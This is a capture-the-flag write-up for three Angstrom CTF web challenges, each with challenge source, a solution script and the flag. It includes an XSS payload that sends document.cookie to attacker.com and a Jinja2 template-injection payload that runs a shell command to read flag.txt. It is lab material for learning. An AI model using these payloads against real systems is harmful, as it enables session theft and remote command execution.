# Angstrom CTF Write Up

## Web

### spinner

***describe:*** spin 10,000 times for flag

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled.png)

***source:***

```jsx
<script>
    const state = {
        dragging: false,
        value: 0,
        total: 0,
        flagged: false,
    }

    const message = async () => {
        if (state.flagged) return
        const element = document.querySelector('.message')
        element.textContent = Math.floor(state.total / 360)

        if (state.total >= 10_000 * 360) {
            state.flagged = true
            const response = await fetch('/falg', { method: 'POST' })
            element.textContent = await response.text()
        }
    }
    message()

    const draw = () => {
        const spinner = document.querySelector('.spinner')
        const degrees = state.value
        spinner.style.transform = `rotate(${degrees}deg)`
    }

    const down = () => {
        state.dragging = true
    }

    const move = (e) => {
        if (!state.dragging) return

        const spinner = document.querySelector('.spinner')
        const center = {
            x: spinner.offsetLeft + spinner.offsetWidth / 2,
            y: spinner.offsetTop + spinner.offsetHeight / 2,
        }
        const dy = e.clientY - center.y
        const dx = e.clientX - center.x
        const angle = (Math.atan2(dy, dx) * 180) / Math.PI

        const value = angle < 0 ? 360 + angle : angle
        const change = value - state.value

        if (0 < change && change < 180) state.total += change
        if (0 > change && change > -180) state.total += change
        if (change > 180) state.total -= 360 - change
        if (change < -180) state.total += 360 + change

        state.value = value

        draw()
        message()
    }

    const up = () => {
        state.dragging = false
    }

    document.querySelector('.handle').addEventListener('mousedown', down)
    window.addEventListener('mousemove', move)
    window.addEventListener('mouseup', up)
    window.addEventListener('blur', up)
    window.addEventListener('mouseleave', up)
</script>
```

***script:***

```jsx
(function() {
    const moveSpinner = () => {
        const spinner = document.querySelector('.spinner');
        let angle = 0;
        const increment = 360; // Số độ mỗi lần xoay, tăng từ 10 lên 30

        const interval = setInterval(() => {
            if (state.total >= 10_000 * 360) {
                clearInterval(interval);
                message(); // Hiển thị thông báo khi đủ vòng
                return;
            }

            angle += increment;
            angle = angle % 360; // Giữ giá trị góc trong khoảng 0-359

            const change = increment;
            state.total += change;
            state.value = angle;

            draw(); // Vẽ lại spinner với góc mới
            message(); // Cập nhật thông điệp hiển thị
        }, 0.01); // Thời gian giữa các lần xoay, giảm từ 1ms xuống 0.1ms
    }

    // Gọi hàm moveSpinner để bắt đầu quá trình tự động xo
    moveSpinner();
})();
```

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled%201.png)

flag = actf{b152d497db04fcb1fdf6f3bb64522d5e}

### markdown

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled%202.png)

***source:***

```jsx
const crypto = require('crypto')

const express = require('express')
const app = express()

const posts = new Map()

app.use(express.urlencoded({ extended: false }))

app.get('/', (_req, res) => {
    const placeholder = [
        '# Note title',
        'Content of the note. You can use *italics*!',
    ].join('\n')

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>Pastebin</h1>
            <form action="/create" method="POST">
                <textarea name="content">${placeholder}</textarea>
                <button type="submit">Create</button>
            </form>
        </div>
    `)
})

app.get('/flag', (req, res) => {
    const cookie = req.headers.cookie ?? ''
    res.type('text/plain').end(
        cookie.includes(process.env.TOKEN)
        ? process.env.FLAG
        : 'no flag for you'
    )
})

app.get('/view/:id', (_req, res) => {
    const marked = (
        'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
    )

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
        </div>
        <script src="${marked}"></script>
        <script>
            const content = document.querySelector('.content')
            const id = document.location.pathname.split('/').pop()

            delete (async () => {
                const response = await fetch(\`/content/\${id}\`)
                const text = await response.text()
                content.innerHTML = marked.parse(text)
            })()
        </script>
    `)
})

app.post('/create', (req, res) => {
    const data = req.body.content ?? ''
    const id = crypto.randomBytes(8).toString('hex')
    posts.set(id, data)
    res.redirect(`/view/${id}`)
})

app.get('/content/:id', (req, res) => {
    const id = req.params.id
    const data = posts.get(id) ?? ''
    res.type('text/plain').end(data)
})

app.get('/style.css', (_req, res) => {
    res.type('text/css').end(`
        * {
          font-family: system-ui, -apple-system, BlinkMacSystemFont,
            'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
          box-sizing: border-box;
        }

        html,
        body {
          margin: 0;
        }

        .content {
          padding: 2rem;
          width: 90%;
          max-width: 900px;
          margin: auto;
        }

        input:not([type='submit']) {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
        }

        textarea {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
          resize: vertical;
          font-family: monospace;
        }

        input[type='submit'] {
          margin-bottom: 16px;
        }

    `)
})

app.listen(3000)
```

***script:***

```jsx
# Note title
<iframe src="javascript:fetch('https://attacker.com/?cookie=' + document.cookie)"></iframe>
```

send to admin (I use webhook to catch the request)

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled%203.png)

get the cookies token

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled%204.png)

flag = actf{b534186fa8b28780b1fcd1e95e2a2e2c}

### winds

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled%205.png)

***source:***

```jsx
import random

from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

@app.get('/')
def root():
    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
        </div>
    ''', error=request.args.get('error', ''))

@app.post('/shout')
def shout():
    text = request.form.get('text', '')
    if not text:
        return redirect('/?error=No message provided...')

    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)

    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
            <div>
                Your voice echoes back: %s
            </div>
        </div>
    ''' % jumbled, error=request.args.get('error', ''))

@app.get('/style.css')
def style():
    return '''
        html, body { margin: 0 }
        .content {
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
            font-family: Helvetica, sans-serif;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
    '''
```

***script:***

```jsx
import random

text = "{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}"
random.seed(0)
jumbled = list(range(len(text)))
random.shuffle(jumbled)
new_text = list(text)

for index, value in enumerate(jumbled):
  	new_text[value] = text[index]

print("".join(new_text))
```

![Untitled](Angstrom%20CTF%20Write%20Up%20f6aab9c53cd5465eb4a307e1cb9da5e7/Untitled%206.png)

flag = actf{2cb542c944f737b85c6bb9183b7f2ea8}